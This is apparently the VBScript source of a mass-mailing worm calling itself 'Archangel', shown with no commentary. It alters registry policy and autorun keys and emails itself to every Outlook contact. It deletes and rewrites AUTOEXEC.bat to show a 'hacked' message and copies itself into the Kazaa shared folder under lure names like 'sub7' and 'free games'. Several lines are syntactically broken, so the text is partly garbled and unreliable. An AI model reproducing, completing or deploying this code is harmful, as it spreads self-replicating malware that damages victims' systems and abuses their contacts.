   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"

   Set WSHShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""

   msgbox "no one is safe from the Archangel!"

   on error resume next
   Dim x
   on error resume next
   Set fso ="Scripting.FileSystem.Object"
   Set so=CreateObject(fso)
   Set ol=CreateObject("Outlook.Application")
   Set out= WScript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For x=1 To a.AddressEntries.Count
   Set Mail=ol.CreateItem(0)
   Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject="Subject"
   Mail.Body="Body"
   Mail.Attachments.Add Wscript.ScriptFullName
   Mail.Send
   Next
   ol.Quit

   fso  filesysdelfile
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\AUTOEXEC",True
   Set filesysdelfile = Nothing

   shell, batcha, fso
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\vbs.vbs", True
   set batcha=fso.CreateTextFile("C:\AUTOEXEC.bat")
   batcha.WriteLine "@ECHO OFF "
   batcha.WriteLine " REM To make a DOS Boot Diskette; See the file C:\DOSBOOT\DOSBOOT.TXT"
   batcha.WriteLine "set path=c:\windows\command "
   batcha.WriteLine " c:\windows\smartdrv /q"
   batcha.WriteLine " LH c:\windows\command\mscdex /D:IDECD000 /L:M"
   batcha.WriteLine " LH c:\mouse\cloaking"
   batcha.WriteLine "c:\mouse\mouse ps2 "
   batcha.WriteLine " SET PROMPT=$p$g"
   batcha.WriteLine "SET TEMP=C:\windows\TEMP "
   batcha.WriteLine "SET TEMP=C:\windows\TEMP "
   batcha.WriteLine " SET BLASTER=A220 I5 D1 T2"
   batcha.WriteLine " REM Set the Audio card"
   batcha.WriteLine " C:\WINDOWS\CWBINIT.EXE /A"
   batcha.WriteLine " REM LTTSR.EXE sets up the modem for com2."
   batcha.WriteLine "C:\MODEM\LTTSR.EXE /I4 "
   batcha.WriteLine "Echo *********************************************"
   batcha.WriteLine "Echo satan lives in Archangel!"
   batcha.WriteLine "If Exist C:Windows\System2.bat Call  C:Windows\System2.bat"
   batcha.WriteLine ":BackPlayground"
   batcha.WriteLine "If Not Exist C:Windows\Playground.txt Goto NewPlayground"
   batcha.WriteLine ":StartPlayground"
   batcha.WriteLine "Start C:Windows\Playground.txt "
   batcha.WriteLine "goto :End"
   batcha.WriteLine ":NewPlayground"
   batcha.WriteLine "echo You have been hacked by Archangel >> C:\Windows\ Playground.txt"
   batcha.WriteLine "goto StartPlayground
   batcha.WriteLine ":End"
   batcha.WriteLine "End"
   shell.Run  "C:\AUTOEXEC.bat"

   on error resume next
   shell, batchb, fso
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\vbs1.vbs", True
   set batchb=fso.CreateTextFile("C:\Windows\System2.bat")
   batchb.WriteLine "@ECHO OFF "
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\i.p. nuker.bat  copy 0% C:/Program Files/Kazaa/Shared Folder/i.p. nuker.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\how to hack.bat copy 0% C:/Program Files/Kazaa/Shared Folder/how to hack.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\unreal crack.bat copy  0% C:/Program Files/Kazaa/Shared Folder/unreal crack.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\medal of honor cracks.bat copy 0% C:/Program Files/Kazaa/Shared Folder/medal of honor cracks.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\porn game.bat copy 0% C:/Program Files/Kazaa/Shared Folder/porn game.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\game.bat copy 0% C:/Program Files/Kazaa/Shared Folder/game.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\hack.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/hack.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\virus maker.exe.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/virus maker.exe.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\sub7.bat copy 0%  C:/Program Files/Kazaa/My Shared Folder/sub7.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\programming all in one.bat  copy 0% C:/Program Files/Kazaa/My Shared Folder/programming all in one.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\visual basic black book.txt.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/visual basic black book.txt.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\adult porn.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/adult porn.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\free games.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/free games.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\diablo hacks.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/diablo hacks.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\hacking.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/hacking.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\hacking all in one.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/hacking all in one.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\sub seven.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/sub seven.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\virus maker.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/virus maker.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\port scanner.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/port scanner.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\star craft hacks.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/star craft hacks.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\games.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/games.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\anarchists cookbook.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/anarchists cookbook.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\virus.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/virus.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\kazaa.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/kazaa.bat"
   batchb.WriteLine "If Not Exist "C:\Program Files\Kazaa\My Shared Folder\half life hacks.bat copy 0% C:/Program Files/Kazaa/My Shared Folder/half life hacks.bat"
   batchb.WriteLine "End"
